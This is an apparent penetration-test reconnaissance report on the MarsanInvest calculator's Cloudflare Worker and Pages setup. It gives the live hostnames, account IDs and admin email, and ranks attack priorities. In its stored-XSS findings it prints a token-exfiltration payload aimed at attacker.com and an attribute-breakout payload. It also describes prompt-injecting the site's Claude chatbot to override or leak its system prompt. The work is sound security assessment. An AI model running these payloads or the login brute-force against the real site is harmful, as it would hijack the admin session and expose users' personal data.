# Reconnaissance Deliverable: MarsanInvest

## 0) HOW TO READ THIS

This reconnaissance report provides a comprehensive map of the MarsanInvest application's attack surface. The application is a Croatian financial calculator (pension/ETF comparison tool) with a static Cloudflare Pages frontend and a Cloudflare Worker backend.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint — focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates. Note this application uses a binary auth model (anon vs admin only).
- **Section 6.4 (Guards Directory):** Catalog of authorization controls — there are only two guards: no-auth (public) and Bearer/cookie token (admin).
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy — binary model (anonymous vs admin). No multi-tenant or multi-user structure.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints — vertical escalation is the primary attack surface since there are no user accounts, only admin.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows both the Cloudflare Pages frontend and the Cloudflare Worker backend. Pay attention to flows marked `auth:admin` — these are the vertical escalation targets. The worker URL (`empty-pine-8e64.marin-marsan.workers.dev`) is the primary attack surface separate from the CDN-hosted frontend.

**Priority Order for Testing:** Start with Section 8's vertical escalation candidates (brute-force admin login), then Section 5's stored XSS input vectors (admin session hijack via feedback), then Section 9's injection sources (prompt injection, email header injection).

---

## 1. Executive Summary

MarsanInvest is a Croatian financial calculator web application that compares pension investment strategies (Croatian DMF 3rd pillar, PEPP, ETF investments). The application is designed for Croatian retail investors making pension and savings decisions.

**Architecture:** Static SPA frontend on Cloudflare Pages (`mminvest.pages.dev`) backed by a single Cloudflare Worker (`empty-pine-8e64.marin-marsan.workers.dev`) that provides AI chatbot functionality (via Anthropic Claude API), user feedback collection, poll management, star ratings, and an admin panel.

**Core Technology Stack:**
- Frontend: Vanilla JavaScript SPA (no framework), Chart.js 4.4.1 via CDN, served from Cloudflare Pages
- Backend: Cloudflare Worker (V8 JavaScript isolate), Cloudflare KV storage
- External APIs: Anthropic Claude (`claude-sonnet-4-20250514`), Resend email service
- Auth: Single admin account using SHA-256 derived static bearer token / session cookie

**Primary Attack Surface Components:**
1. Public feedback submission endpoint (no auth, stores PII, stored XSS vector for admin panel)
2. Admin login endpoint (no rate limiting, static deterministic token)
3. AI chat endpoint (no rate limiting, direct Anthropic API proxy, response rendered via innerHTML)
4. Poll/rating endpoints (no auth, no rate limiting, data manipulation possible)
5. Admin panel (accessed via cookie or Bearer token — single static token, never rotates)

---

## 2. Technology & Service Map

- **Frontend:** Vanilla JavaScript ES6+ SPA, Chart.js 4.4.1 (CDN, no SRI), Google Fonts (CDN, no SRI), CSS3. No framework, no TypeScript, no build process. Hosted on Cloudflare Pages.
- **Backend:** Cloudflare Worker (JavaScript V8 isolate), single `worker.js` file. Cloudflare KV (key-value store, namespace binding `AI_CONFIG`, ID `9948ef6dccd047b59c91c3440f36abdd`).
- **External APIs:** Anthropic Claude API (`https://api.anthropic.com/v1/messages`, model `claude-sonnet-4-20250514`), Resend email API (`https://api.resend.com/emails`).
- **Infrastructure:** Cloudflare Pages (CDN-hosted static assets), Cloudflare Workers (serverless edge compute). No traditional server, no container, no database.
- **Cloudflare Account ID:** `3e7eaa415aad36e91ce03732b88c3992` (exposed in `wrangler.toml`)
- **KV Namespace ID:** `9948ef6dccd047b59c91c3440f36abdd` (exposed in `wrangler.toml`)

**Identified Subdomains / Hostnames:**
- `mminvest.pages.dev` — Static frontend (Cloudflare Pages)
- `empty-pine-8e64.marin-marsan.workers.dev` — Backend Worker (primary API surface)

**Open Ports & Services:**
- Both hosts: HTTPS 443 only (Cloudflare-terminated TLS)
- No other open ports (serverless architecture, no exposed VM/container)

**No API schema files** (no OpenAPI/Swagger, no GraphQL schemas).

---

## 3. Authentication & Session Management Flow

### Entry Points
- `POST /admin/login` — HTML form-based login (form-encoded body)
- `POST /admin/api/login` — JSON API login (used by SPA admin panel in `script.js`)
- `GET /admin/logout` — Session termination (any HTTP method works)
- No public user registration or password reset flows exist

### Mechanism (Step-by-Step)

1. **Credential Submission:** Client POSTs `{ username, password }` as JSON to `POST /admin/api/login` (or form-encoded to `POST /admin/login`)
2. **Credential Verification:** `worker.js:294-295` — Plain `===` string comparison against `env.ADMIN_USER` and `env.ADMIN_PASS` (Cloudflare Worker secrets). No timing-safe comparison.
3. **Token Generation:** `worker.js:122-126, 273-274` — SHA-256 of the string `ADMIN_USER + ':' + ADMIN_PASS + ':marsanai-session'`, returned as 64-char lowercase hex. Token is **static and deterministic** — never rotates, no nonce.
4. **Session Establishment:**
   - For form login: Sets cookie `marsanai_session=<token>; Path=/; Max-Age=86400; HttpOnly; Secure; SameSite=Strict` (`worker.js:299`)
   - For API login: Returns `{ success: true, token: "<validToken>" }` in JSON response body. Client stores token in `sessionStorage['marsanai_admin']` (`script.js:1385`).
5. **Request Validation:**
   - Cookie-based (HTML routes): `cookies['marsanai_session'] === validToken` (`worker.js:275-276`)
   - Bearer-based (API routes): `authHeader.replace('Bearer ', '') === validToken` (`worker.js:333-336`)
6. **Logout:** `GET /admin/logout` clears cookie with `Max-Age=0` and redirects to `/admin`. No server-side session invalidation (no session table).

**Code Pointers:**
- Token generation: `worker.js:122-126` (hashToken), `worker.js:273-274` (sessionSecret)
- Form login handler: `worker.js:290-307`
- API login handler: `worker.js:312-329`
- Cookie session validation: `worker.js:275-276`
- Bearer token validation: `worker.js:333-336`
- Client-side admin login: `script.js:1363-1398`

### 3.1 Role Assignment Process

- **Role Determination:** Binary — either the request has a valid token (admin) or not (anonymous). No roles in JWT claims or database. No role lookup.
- **Default Role:** Anonymous (no auth required for public endpoints)
- **Role Upgrade Path:** Authenticate via `POST /admin/login` or `POST /admin/api/login` with correct credentials. No self-service; credentials are set as Cloudflare Worker secrets.
- **Code Implementation:** `worker.js:294-295` (credential check), `worker.js:273-274` (token derivation)

### 3.2 Privilege Storage & Validation

- **Storage Location:**
  - Server-side: No server-side session store. Validation is stateless — token value is recomputed from secrets on every request.
  - Client-side cookie: `marsanai_session` (HttpOnly, Secure, SameSite=Strict, Max-Age=86400)
  - Client-side bearer: `sessionStorage['marsanai_admin']` in browser (accessible to JavaScript)
- **Validation Points:** Two separate locations — cookie check at `worker.js:275-276` (for HTML routes), Bearer check at `worker.js:333-336` (for API routes). Same token value accepted by both.
- **Cache/Session Persistence:** 24-hour cookie expiry client-side; token itself never expires server-side (valid until credentials change).
- **Code Pointers:** `worker.js:273-276` (token generation + cookie validation), `worker.js:333-336` (Bearer validation)

### 3.3 Role Switching & Impersonation

- **Impersonation Features:** None. Single admin account only.
- **Role Switching:** None.
- **Audit Trail:** None. No logging of admin actions.

---

## 4. API Endpoint Inventory

**Worker base URL:** `https://empty-pine-8e64.marin-marsan.workers.dev`

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|------------------------|---------------------------|
| OPTIONS | `/*` | anon | None | None (CORS preflight) | Global OPTIONS handler for CORS. Returns 204. `worker.js:142-144` |
| POST | `/` | anon | None | None | AI chat proxy. Accepts `{ messages: Array }` (last 10 messages), proxies to Anthropic API, returns AI response JSON verbatim. No rate limiting. `worker.js:599-669` |
| GET | `/status` | anon | None | None | Returns `{ ai_enabled: bool }` — AI on/off state. Any HTTP method works. `worker.js:591-597` |
| GET | `/rating-stats` | anon | None | None | Returns `{ count, avg }` aggregate rating stats. Any HTTP method works. `worker.js:570-588` |
| POST | `/rating` | anon | None | None | Submit star rating. Body: `{ rating: 1-5, prevRating: int }`. No deduplication, no rate limiting. `worker.js:539-567` |
| POST | `/feedback` | anon | None | None | Submit feedback. Body: `{ type, text, rating, email }`. Stores to KV, sends email notification. No rate limiting. `worker.js:478-536` |
| POST | `/polls` | anon | None | None | Submit poll votes. Body: `{ pollId, votes: { option: count } }`. No rate limiting. Arbitrary vote counts accepted. `worker.js:446-475` |
| POST | `/admin/login` | anon (credentials in body) | None | None (this IS the auth endpoint) | HTML form-based login. Form-encoded `username`, `password`. Sets session cookie. No lockout. `worker.js:290-307` |
| POST | `/admin/api/login` | anon (credentials in body) | None | None (this IS the auth endpoint) | JSON API login. Returns `{ success, token }`. Token exposed in response body. No lockout, no rate limiting. `worker.js:312-329` |
| GET | `/admin/logout` | anon | None | None | Clears session cookie. Any HTTP method triggers logout. `worker.js:279-287` |
| GET | `/admin` | admin | None | Cookie `marsanai_session` | Admin dashboard HTML. Returns login page if unauthenticated. `worker.js:394-398` |
| POST | `/admin` | admin | None | Cookie `marsanai_session` | Toggle AI bot via form POST. Body: `action=on\|off`. `worker.js:382-391` |
| GET | `/admin/api/status` | admin | None | Bearer token (`Authorization: Bearer <token>`) | Returns AI on/off state. `worker.js:338-349` |
| POST | `/admin/api/toggle` | admin | None | Bearer token | Toggle AI bot. Body: `{ action: 'on'\|'off' }`. `worker.js:352-372` |
| GET | `/admin/api/feedback` | admin | None | Bearer token | Returns full `feedback_log` KV array (all user submissions including emails). `worker.js:224-265` |
| POST | `/admin/api/feedback/reply` | admin | `idx` (array index) | Bearer token | Reply to feedback entry at index `idx`. Body: `{ idx: int, reply: string }`. Sends email via Resend. `worker.js:147-221` |
| GET | `/admin/api/polls` | admin | None | Bearer token | Returns full `poll_votes` KV object. `worker.js:224-265` |

**Notes on Routing Anomalies:**
- `/admin/logout` triggers on **any HTTP method** (GET, POST, PUT, DELETE) — `worker.js:279`
- `/status` and `/rating-stats` respond to **any HTTP method**
- A dead-code duplicate block for `/admin/api/polls` and `/admin/api/feedback` exists at `worker.js:402-443` but is unreachable
- The AI chat endpoint matches all POST requests that don't match earlier routes (fallthrough at `worker.js:618`)

---

## 5. Potential Input Vectors for Vulnerability Analysis

### URL Parameters
- None identified. The application does not use query string parameters in any of its API endpoints or frontend routing.
- No URL path parameters (no `:id` style dynamic segments — `idx` is passed in the POST body, not the URL).

### Hash Fragment
- `window.location.hash === '#admin'` (`script.js:1340`) — triggers admin panel open on page load. Hash value is only compared, never rendered to DOM. Not an injection vector.

### POST Body Fields (JSON)

**`POST /` (AI Chat) — `worker.js:618-668`:**
- `messages` (Array of `{role, content}` objects) — user-controlled chat history. Last 10 entries passed verbatim to Anthropic API. `worker.js:648-650`

**`POST /feedback` — `worker.js:478-536`:**
- `type` (string, truncated to 30 chars) — stored raw in KV, rendered unescaped in admin panel (`script.js:1488`) and in notification email subject (`worker.js:507`). **Stored XSS + email header injection vector.** `worker.js:483`
- `text` (string, truncated to 1000 chars) — stored raw in KV, HTML-escaped on render in admin panel (`script.js:1493`) and email body (`worker.js:515`). Lower XSS risk but watch for incomplete escaping.
- `email` (string, truncated to 200 chars) — stored raw in KV, rendered **unescaped** in admin panel (`script.js:1479`) and **unescaped** in notification email HTML body (`worker.js:514`). **Primary stored XSS vector.** `worker.js:486`
- `rating` (number) — validated as integer 1-5. `worker.js:543-544`
- `ts` (timestamp) — client-supplied timestamp, stored as-is.

**`POST /polls` — `worker.js:446-475`:**
- `pollId` (string, truncated to 50 chars) — used as KV object key, stored. `worker.js:449`
- `votes` (object) — keys truncated to 50 chars, values coerced with `Number()`. **Arbitrary large integers accepted — vote manipulation possible.** `worker.js:460-465`

**`POST /rating` — `worker.js:539-567`:**
- `rating` (int 1-5) — validated. `worker.js:543`
- `prevRating` (int) — accepted from client, used to remove prior rating from array. **Client-supplied, unverified — rating manipulation vector.** `worker.js:553-558`

**`POST /admin/login` — `worker.js:290-307`:**
- `username` (form-encoded string) — compared to `env.ADMIN_USER`. `worker.js:294`
- `password` (form-encoded string) — compared to `env.ADMIN_PASS`. `worker.js:294`

**`POST /admin/api/login` — `worker.js:312-329`:**
- `username` (JSON string) — compared to `env.ADMIN_USER`. `worker.js:315`
- `password` (JSON string) — compared to `env.ADMIN_PASS`. `worker.js:315`

**`POST /admin/api/toggle` — `worker.js:352-372`:**
- `action` (string `'on'`|`'off'`) — sanitized by ternary. Safe. `worker.js:357`

**`POST /admin/api/feedback/reply` — `worker.js:147-221`:**
- `idx` (integer) — array index into `feedback_log`. **No bounds checking beyond array length** — negative index or out-of-bounds handled by JavaScript returning `undefined`. `worker.js:160`
- `reply` (string, truncated to 2000 chars) — stored in KV with partial escaping for email. `worker.js:162, 204`

### HTTP Headers
- `Authorization` — `Bearer <token>` for admin API endpoints. `worker.js:333-335`
- `Cookie` — `marsanai_session=<token>` for admin HTML endpoints. `worker.js:275-276`
- `Content-Type` — Used to determine JSON vs form-encoded parsing. Not explicitly validated for most endpoints.

### Cookie Values
- `marsanai_session` — Admin session token. Value compared to static SHA-256 hash. `worker.js:276`

### Client-side localStorage (Manipulation Vectors)
- `miv_polls` (JSON object) — Stores poll vote tallies and selections. Read on init and used to display results. If another XSS runs first, can poison displayed results. `script.js:1137-1140, 1189-1205`
- `miv_rating` (integer string) — Stores user's previous rating. Read as `prevRating` on next submission. Can be set to any integer to manipulate server-side rating array. `script.js:911`
- `marsan-lang` (string `'hr'`|`'en'`) — Language preference. Only controls `setLang()` call, no DOM injection from this value. Safe.

---

## 6. Network & Interaction Map

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| UserBrowser | Identity | Internet | Browser/JS | PII, Tokens | End-user visiting mminvest.pages.dev |
| AdminBrowser | Identity | Internet | Browser/JS | Tokens, Secrets | Admin user accessing /admin panel |
| CloudflarePages | ExternAsset | Edge | Cloudflare Pages CDN | Public | Serves static frontend: index.html, script.js, style.css |
| CloudflareWorker | Service | App | Cloudflare Worker (JS V8) | PII, Tokens, Secrets | Main backend: all API routes, auth, KV operations, external API calls. URL: `empty-pine-8e64.marin-marsan.workers.dev` |
| CloudflareKV | DataStore | Data | Cloudflare KV (`AI_CONFIG`) | PII | Stores feedback_log (emails, text), poll_votes, ratings, ai_enabled flag. ID: `9948ef6dccd047b59c91c3440f36abdd` |
| AnthropicAPI | ThirdParty | ThirdParty | Anthropic Claude API | Public | AI chat completions. Endpoint: `api.anthropic.com/v1/messages`. Model: `claude-sonnet-4-20250514` |
| ResendAPI | ThirdParty | ThirdParty | Resend Email Service | PII | Transactional email. Endpoint: `api.resend.com/emails`. Sends feedback notifications to admin and replies to users |
| ChartJsCDN | ExternAsset | Internet | cdnjs.cloudflare.com | Public | Chart.js 4.4.1. No SRI. Loaded by browser. |
| GoogleFontsCDN | ExternAsset | Internet | fonts.googleapis.com | Public | DM Serif, DM Mono, DM Sans, Dancing Script fonts. No SRI. |

### 6.2 Entity Metadata

| Title | Metadata Key: Value |
|-------|---------------------|
| CloudflarePages | Hosts: `https://mminvest.pages.dev`; Serves: `index.html`, `script.js`, `style.css`; Auth: None; CDN: Cloudflare global |
| CloudflareWorker | Hosts: `https://empty-pine-8e64.marin-marsan.workers.dev`; Endpoints: `POST /`, `GET /status`, `GET /rating-stats`, `POST /rating`, `POST /feedback`, `POST /polls`, `POST /admin/login`, `POST /admin/api/login`, `GET /admin/logout`, `GET /admin`, `POST /admin`, `GET /admin/api/status`, `POST /admin/api/toggle`, `GET /admin/api/feedback`, `POST /admin/api/feedback/reply`, `GET /admin/api/polls`; Auth: Bearer Token (admin API), Session Cookie (admin HTML); CORS: `Access-Control-Allow-Origin: *`; Runtime: V8 isolate |
| CloudflareKV | Engine: Cloudflare KV; Binding: `AI_CONFIG`; Namespace ID: `9948ef6dccd047b59c91c3440f36abdd`; Exposure: Worker-only (not directly internet-accessible); Keys: `ai_enabled`, `feedback_log` (JSON array, max 200), `poll_votes` (JSON object), `ratings` (JSON array, max 10000) |
| AnthropicAPI | Issuer: `api.anthropic.com`; Auth: `x-api-key: env.ANTHROPIC_API_KEY`; Model: `claude-sonnet-4-20250514`; Max tokens: 600; Input: `messages` array (user-controlled, last 10) |
| ResendAPI | Issuer: `api.resend.com`; Auth: `Bearer env.RESEND_API_KEY`; From: `onboarding@resend.dev`; Admin notification to: `marin.marsan@gmail.com` (hardcoded `worker.js:506`) |
| AdminBrowser | Token storage: `sessionStorage['marsanai_admin']` (accessible to JS); Cookie: `marsanai_session` (HttpOnly, Secure, SameSite=Strict, 24h) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| UserBrowser → CloudflarePages | HTTPS | `:443 /` | None | Public |
| UserBrowser → CloudflareWorker | HTTPS | `:443 POST /` | None | Public |
| UserBrowser → CloudflareWorker | HTTPS | `:443 GET /status` | None | Public |
| UserBrowser → CloudflareWorker | HTTPS | `:443 GET /rating-stats` | None | Public |
| UserBrowser → CloudflareWorker | HTTPS | `:443 POST /rating` | None | Public |
| UserBrowser → CloudflareWorker | HTTPS | `:443 POST /feedback` | None | PII |
| UserBrowser → CloudflareWorker | HTTPS | `:443 POST /polls` | None | Public |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 POST /admin/api/login` | None (is auth endpoint) | Secrets |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 GET /admin` | auth:admin (cookie) | Tokens, PII |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 POST /admin` | auth:admin (cookie) | Tokens |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 GET /admin/api/status` | auth:admin (Bearer) | Public |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 POST /admin/api/toggle` | auth:admin (Bearer) | Public |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 GET /admin/api/feedback` | auth:admin (Bearer) | PII |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 POST /admin/api/feedback/reply` | auth:admin (Bearer) | PII |
| AdminBrowser → CloudflareWorker | HTTPS | `:443 GET /admin/api/polls` | auth:admin (Bearer) | Public |
| CloudflareWorker → CloudflareKV | Token | KV binding `AI_CONFIG` | worker-binding-only | PII, Tokens |
| CloudflareWorker → AnthropicAPI | HTTPS | `:443 /v1/messages` | api-key | Public (user messages) |
| CloudflareWorker → ResendAPI | HTTPS | `:443 /emails` | api-key | PII (emails, feedback content) |
| UserBrowser → ChartJsCDN | HTTPS | `:443 /npm/chart.js@4.4.1/...` | None, no-SRI | Public |
| UserBrowser → GoogleFontsCDN | HTTPS | `:443 /css2?family=...` | None, no-SRI | Public |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:admin (cookie) | Auth | Requires valid `marsanai_session` cookie equal to SHA-256(`ADMIN_USER:ADMIN_PASS:marsanai-session`). Set on `/admin/login` form login. Cookie is HttpOnly, Secure, SameSite=Strict, Max-Age=86400. `worker.js:275-276` |
| auth:admin (Bearer) | Auth | Requires `Authorization: Bearer <token>` header where token equals SHA-256(`ADMIN_USER:ADMIN_PASS:marsanai-session`). Same token value as cookie. `worker.js:333-336` |
| api-key | Auth | Cloudflare Worker secret env vars (`ANTHROPIC_API_KEY`, `RESEND_API_KEY`) used as API credentials for outbound calls. Not user-controllable. |
| worker-binding-only | Network | Cloudflare KV is accessible only via the Worker binding — not directly exposed to the internet. |
| cors:wildcard | Protocol | `Access-Control-Allow-Origin: *` — all origins allowed. `worker.js:12-16`. Note: credentials (cookies) cannot be sent with wildcard CORS, so admin cookie auth is not cross-origin exploitable, but Bearer token API is fully cross-origin accessible. |
| no-sri | Protocol | Chart.js and Google Fonts loaded from CDN without Subresource Integrity — supply chain risk. |

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 | Global | No authentication required. Access to all public endpoints and read-only calculator functionality. |
| admin | 10 | Global | Valid `marsanai_session` cookie or `Authorization: Bearer <token>` header. Single hardcoded account via Worker secrets. `worker.js:275-276, 333-336` |

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anonymous → admin

No parallel roles exist — binary model only.

anonymous:  POST /, GET /status, GET /rating-stats, POST /rating,
            POST /feedback, POST /polls, POST /admin/login,
            POST /admin/api/login, GET /admin/logout

admin:      All of the above PLUS:
            GET /admin, POST /admin, GET /admin/api/status,
            POST /admin/api/toggle, GET /admin/api/feedback,
            POST /admin/api/feedback/reply, GET /admin/api/polls
```

**Note on Token Persistence:** The admin token is SHA-256(`ADMIN_USER:ADMIN_PASS:marsanai-session`) — static, deterministic. Once obtained (via brute force, credential leak, or network capture), it is valid indefinitely until credentials change. No session rotation mechanism exists.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|----------------------|
| anonymous | `https://mminvest.pages.dev/` | All public calculator pages; all `/api/*` public endpoints | None |
| admin | `https://empty-pine-8e64.marin-marsan.workers.dev/admin` | `/admin`, `/admin/*` | Session cookie (`marsanai_session`) OR Bearer token |

**Alternative admin entry:** Navigate to `https://mminvest.pages.dev/#admin` — triggers admin panel overlay in the SPA via `script.js:1340`. Uses JSON API login (`POST /admin/api/login`) and Bearer token auth.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|-----------------|
| anonymous | None | None required | N/A |
| admin | Cookie check: `worker.js:275-276`; Bearer check: `worker.js:333-336` | `cookies['marsanai_session'] === validToken` OR `bearerToken === validToken` | Cookie (`marsanai_session`, HttpOnly) for HTML routes; `sessionStorage['marsanai_admin']` for SPA API calls |

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

No horizontal escalation candidates exist. The application has no per-user accounts — there is only a single admin account and anonymous users. Feedback entries are accessed by array index (`idx` in `POST /admin/api/feedback/reply`), but this is only accessible to the admin role, and there is only one admin. No IDOR between users is possible.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|-----------------|---------------------|-----------|-------------|
| Low | `POST /admin/api/feedback/reply` | `idx` (body param, array index) | feedback/PII | Admin-only; no horizontal escalation possible (single admin). Out-of-bounds `idx` may return `undefined`. |

### 8.2 Vertical Privilege Escalation Candidates

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|-----------------|---------------|------------|
| admin | `POST /admin/api/login` | Admin authentication — **no rate limiting, no lockout, no CAPTCHA**. Static token returned in response body. Cross-origin accessible due to `CORS: *`. | **Critical** |
| admin | `POST /admin/login` | HTML form admin login — same as above, form-encoded. | **High** |
| admin | `GET /admin/api/feedback` | Returns all user PII (emails, feedback text) from KV | **High** |
| admin | `POST /admin/api/feedback/reply` | Sends email via Resend API using admin credentials | **High** |
| admin | `GET /admin/api/polls` | Returns all poll data | **Medium** |
| admin | `POST /admin/api/toggle` | Controls AI bot availability | **Medium** |

**Note:** Once admin token is obtained (brute force or XSS-based session hijack), the attacker has access to all admin functionality listed above.

### 8.3 Context-Based Authorization Candidates

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|---------|---------------------|-----------------|
| Admin Session | `GET /admin/api/feedback` | Login via `/admin/api/login` first | Static token — if token is known, can call API endpoints directly without going through login flow |
| Feedback Reply | `POST /admin/api/feedback/reply` | Feedback entry must exist at `idx` | Can send arbitrary `idx` values; no bounds check beyond array length. `idx` out of bounds → `items[idx]` is undefined → potential null reference error / unhandled exception |
| AI Chat | `POST /` | AI must be enabled (`ai_enabled` KV key) | `worker.js:612-616` — if AI disabled, returns error. Can be bypassed by toggling via admin endpoint. |

---

## 9. Injection Sources

### SQL Injection
**None.** No SQL database. Cloudflare KV is used exclusively. KV keys are string-typed and have no query language. `worker.js` performs no SQL queries.

### Command Injection
**None.** Cloudflare Workers V8 isolate has no shell/process execution APIs (`exec`, `spawn`, `child_process` do not exist in this runtime). No command injection surface.

### Server-Side Template Injection (SSTI)
**None.** No server-side template engine (Handlebars, Jinja, EJS, Pug, etc.) is used. HTML is built with JavaScript template literals. All template literal interpolation points in `worker.js` use either hardcoded strings or data sanitized via ternary operators — no user input directly interpolated into server-rendered HTML that reaches dangerous sinks.

### Path Traversal / LFI / RFI
**None.** Cloudflare Workers V8 isolate has no filesystem access. No `fs.readFile`, `require()` with dynamic paths, or file inclusion operations exist.

### Deserialization
**Low Risk — Indirect.** `JSON.parse()` is called on data retrieved from Cloudflare KV at multiple locations (`worker.js:171, 241, 255, 459, 491, 550, 573`). The data was previously stored by the worker itself after user input processing. If a prior stored XSS or injection poisoned KV data, `JSON.parse` on malformed JSON would throw an unhandled exception causing a 500 error, not code execution. No unsafe deserialization (no `eval`, no `Function()`, no `vm.runInContext`).

### Email Header Injection
**Medium Risk — `POST /feedback` → Resend email subject.**
- **Source:** `body.type` (user-controlled, up to 30 chars), stored at `worker.js:483`
- **Sink:** `worker.js:507` — `subject: \`📬 Novi feedback: ${entry.type} — MarsanInvest\``
- **Path:** User submits `POST /feedback` with crafted `type` field → stored in KV → Worker calls Resend API with subject containing raw user input
- **Risk:** If Resend API does not sanitize subject headers, CRLF injection in `type` field (within 30 char limit) could inject additional email headers. Practical exploitability depends on Resend's header sanitization.
- **File:** `worker.js:507`

### Stored XSS (Primary Injection Chain — Admin Session Hijack)

**CRITICAL — `POST /feedback` email field → admin panel innerHTML:**
- **Source:** `body.email` (user-controlled, up to 200 chars) submitted to `POST /feedback` — no authentication required
- **Storage:** `worker.js:486` — `entry.email = String(body.email || '').slice(0, 200)` — stored raw (no sanitization) in KV `feedback_log`
- **Sink:** `script.js:1479` — `\`<div class="fb-log-email">📧 ${it.email}</div>\`` interpolated into `logEl.innerHTML` (`script.js:1471`)
- **Trigger:** Admin authenticates to admin panel and clicks "Feedback" tab → `loadFeedbackLog()` called → feedback data fetched from `GET /admin/api/feedback` → rendered via innerHTML
- **Impact:** XSS in admin context. Admin Bearer token stored in `sessionStorage['marsanai_admin']` (`script.js:1385`). Payload can exfiltrate: `fetch('https://attacker.com/?t='+sessionStorage.getItem('marsanai_admin'))`. Token is static — once exfiltrated, valid indefinitely.
- **Files:** `worker.js:486` (storage), `script.js:1479` (sink), `script.js:1471` (innerHTML assignment)

**HIGH — `POST /feedback` type field → admin panel innerHTML:**
- **Source:** `body.type` (user-controlled, up to 30 chars)
- **Storage:** `worker.js:483` — stored raw
- **Sink:** `script.js:1488` — `\`<span class="fb-log-type ${it.type}">${typeIcon[it.type]||''} ${it.type}</span>\`` interpolated into `logEl.innerHTML`
- **Attack vector:** HTML attribute breakout. 30-char limit constrains payload: e.g., `"><svg/onload=eval(1)>` (21 chars) fits. Or CSS class injection.
- **Files:** `worker.js:483` (storage), `script.js:1488` (sink)

**HIGH — AI chat response → user's browser innerHTML:**
- **Source:** `data.content[0].text` from Anthropic API response, received at `script.js:1006-1008`; also `$('ai-input').value` at `script.js:994`
- **Sink:** `script.js:968` — `div.innerHTML = \`...<div class="ai-msg-bubble">${html}</div>\``
- **Partial processing:** `text.split('\n').join('<br>')` and `text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')` — these produce more HTML, not less
- **Attack vectors:** (a) User types HTML payload in chat box (self-XSS); (b) Prompt injection causing AI to return malicious HTML; (c) Compromised Anthropic API key or MITM
- **Files:** `script.js:961-968` (sink), `script.js:987-1017` (send flow)

### Prompt Injection
**Medium Risk — `POST /` AI chat endpoint:**
- **Source:** `body.messages` (Array, user-controlled, last 10 entries) — `worker.js:648`
- **Sink:** `messages` field in Anthropic API request — `worker.js:648-650`
- **Path:** User submits crafted messages array → passed verbatim to Anthropic → AI system prompt at `worker.js:630-640` hardcoded but messages are user-controlled
- **Risk:** Standard prompt injection. Attacker can attempt to override system prompt, cause AI to return malicious content that triggers XSS at `script.js:968`, or extract system prompt content.
- **File:** `worker.js:630-650`

### HTML Injection in Email (Admin notification)
**Medium Risk — `POST /feedback` email field → Resend email HTML body:**
- **Source:** `body.email` (user-controlled, 200 chars)
- **Sink:** `worker.js:514` — `${entry.email}` interpolated raw into HTML email body string sent to Resend
- **Impact:** HTML injection in the admin's email notification. If admin's email client renders HTML, this could display misleading content or load external resources (tracking pixels, etc.)
- **File:** `worker.js:514`
